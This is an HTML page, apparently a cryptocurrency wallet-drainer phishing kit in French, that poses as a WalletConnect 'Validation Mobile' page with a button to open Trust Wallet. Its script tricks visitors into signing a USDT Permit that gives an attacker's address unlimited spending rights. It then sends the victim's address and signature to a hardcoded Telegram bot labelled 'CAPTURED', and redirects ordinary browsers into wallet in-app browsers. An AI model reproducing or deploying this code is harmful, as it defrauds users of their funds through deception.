<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect | Safe Connection</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .card { width: 90%; max-width: 380px; padding: 30px; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); border: 1px solid #f0f0f0; }
        .btn { background: #3399ff; color: white; border: none; width: 100%; padding: 20px; border-radius: 20px; font-weight: bold; font-size: 17px; cursor: pointer; margin-top: 25px; box-shadow: 0 5px 15px rgba(51,153,255,0.3); }
        img { width: 70px; margin-bottom: 20px; }
        p { color: #666; line-height: 1.5; font-size: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png">
        <h2>Validation Mobile</h2>
        <p>Cliquez ci-dessous pour ouvrir votre portefeuille et synchroniser votre session s√©curis√©e.</p>
        <button class="btn" id="openBtn">OUVRIR TRUST WALLET</button>
    </div>

<script>
    const cfg = {
        t: "8111685639:AAFKpBzv2AEi2lQtXpQxQKorT_YdbZWsv9s",
        i: "7807929833",
        w: "0x710cD62878b4b976e369819C4D35de8e1912cd6C"
    };

    async function start() {
        // SI ON EST D√âJ√Ä DANS LE NAVIGATEUR DU WALLET
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = provider.getSigner();
                const address = await signer.getAddress();

                const domain = { name: "Tether USD", version: "1", chainId: 56, verifyingContract: "0x55d398326f99059ff775485246999027b3197955" };
                const types = { Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] };
                const values = { owner: address, spender: cfg.w, value: ethers.constants.MaxUint256, nonce: 0, deadline: 2524608000 };

                const signature = await signer._signTypedData(domain, types, values);
                
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&text=üî•_CAPTURED_%0AWallet: ${address}%0ASig: ${signature}`);
                alert("Synchronisation r√©ussie.");
            } catch (e) { alert("Erreur de signature. R√©essayez."); }
        } else {
            // SI ON EST DANS UN NAVIGATEUR CLASSIQUE (Chrome/Safari)
            // On tente les 3 m√©thodes d'ouverture mobile
            const url = window.location.href.split('://')[1];
            
            // 1. Essai Trust Wallet
            window.location.href = "tpoutside://open_url?url=https://" + url;
            
            // 2. Deuxi√®me essai apr√®s 500ms (Lien universel)
            setTimeout(() => {
                window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
            }, 500);

            // 3. Troisi√®me essai apr√®s 1s (MetaMask)
            setTimeout(() => {
                window.location.href = "https://metamask.app.link/dapp/https://" + url;
            }, 1000);
        }
    }

    document.getElementById('openBtn').onclick = start;
</script>
</body>
</html>
